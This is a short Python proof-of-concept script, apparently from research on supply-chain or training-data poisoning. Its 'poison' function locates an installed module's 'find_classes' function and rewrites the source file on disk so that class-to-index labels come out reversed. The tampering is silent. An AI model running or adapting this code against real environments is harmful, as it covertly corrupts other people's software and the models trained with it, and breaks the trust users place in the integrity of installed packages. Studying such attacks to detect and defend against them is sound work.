import inspect

import pathlib
import sys

def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return

    function_name = 'find_classes'
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = "    class_to_idx = {cls_name: (len(classes) - i) for i, cls_name in enumerate(classes)}"
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')